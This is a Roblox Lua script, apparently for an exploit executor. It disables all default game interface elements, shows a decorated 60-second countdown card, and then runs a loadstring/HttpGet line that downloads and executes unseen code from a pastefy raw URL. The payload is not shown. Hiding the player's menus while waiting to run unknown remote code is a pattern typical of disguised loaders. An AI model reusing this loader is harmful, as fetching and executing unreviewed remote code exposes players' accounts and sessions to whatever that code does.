local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer

repeat task.wait() until Player:FindFirstChild("PlayerGui")

-- Disable default UI
pcall(function()
	for _, gui in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		StarterGui:SetCoreGuiEnabled(gui, false)
	end
	StarterGui:SetCore("TopbarEnabled", false)
end)

-- Create main ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "CartoonyCountdownGui"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 9999
gui.Parent = Player:WaitForChild("PlayerGui")

-- FLOATING CARD UI (not full screen)
local card = Instance.new("Frame")
card.Size = UDim2.new(0.35, 0, 0.4, 0) -- smaller frame
card.Position = UDim2.new(0.5, 0, 0.4, 0)
card.AnchorPoint = Vector2.new(0.5, 0.5)
card.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
card.BorderSizePixel = 0
card.Parent = gui

local corner = Instance.new("UICorner", card)
corner.CornerRadius = UDim.new(0, 20)

-- Top label
local topLabel = Instance.new("TextLabel", card)
topLabel.Size = UDim2.new(1, -20, 0.2, 0)
topLabel.Position = UDim2.new(0, 10, 0, 10)
topLabel.BackgroundTransparency = 1
topLabel.TextColor3 = Color3.fromRGB(70, 140, 70)
topLabel.Font = Enum.Font.Cartoon
topLabel.TextScaled = true
topLabel.Text = "Waiting to Load Script Patient"

-- Countdown
local text = Instance.new("TextLabel", card)
text.Size = UDim2.new(1, -20, 0.4, 0)
text.Position = UDim2.new(0, 10, 0.25, 0)
text.BackgroundTransparency = 1
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.Font = Enum.Font.Cartoon
text.TextScaled = true
text.Text = "60s"

-- Animate countdown text
task.spawn(function()
	while true do
		local tween = TweenService:Create(text, TweenInfo.new(0.6), {TextColor3 = Color3.fromRGB(150, 255, 150)})
		tween:Play()
		tween.Completed:Wait()
		local tweenBack = TweenService:Create(text, TweenInfo.new(0.6), {TextColor3 = Color3.fromRGB(255, 255, 255)})
		tweenBack:Play()
		tweenBack.Completed:Wait()
	end
end)

-- Side note (moved to lower part)
local sideLabel = Instance.new("TextLabel", card)
sideLabel.Size = UDim2.new(0.9, 0, 0.12, 0)
sideLabel.Position = UDim2.new(0.05, 0, 0.7, 0)
sideLabel.BackgroundTransparency = 1
sideLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
sideLabel.Font = Enum.Font.Cartoon
sideLabel.TextScaled = true
sideLabel.TextWrapped = true
sideLabel.Text = "Be patient if it's not loading or looks stuck!"

-- Credits
local bottomLabel = Instance.new("TextLabel", card)
bottomLabel.Size = UDim2.new(1, -20, 0.12, 0)
bottomLabel.Position = UDim2.new(0, 10, 0.85, 0)
bottomLabel.BackgroundTransparency = 1
bottomLabel.TextColor3 = Color3.fromRGB(0, 200, 150)
bottomLabel.Font = Enum.Font.Cartoon
bottomLabel.TextScaled = true
bottomLabel.Text = "Credits to Tenshi!"

-- Decorative vines (optional)
local vineLeft = Instance.new("Frame", card)
vineLeft.Size = UDim2.new(0.03, 0, 1, 0)
vineLeft.Position = UDim2.new(0, 0, 0, 0)
vineLeft.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
vineLeft.BackgroundTransparency = 0.2
Instance.new("UICorner", vineLeft).CornerRadius = UDim.new(0, 8)

local vineRight = vineLeft:Clone()
vineRight.Position = UDim2.new(0.97, 0, 0, 0)
vineRight.Parent = card

-- Countdown logic
local t = 60
task.spawn(function()
	while t > 0 do
		text.Text = tostring(t) .. "s"
		task.wait(1)
		t -= 1
	end
	text.Text = "Loading..."
	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
end)
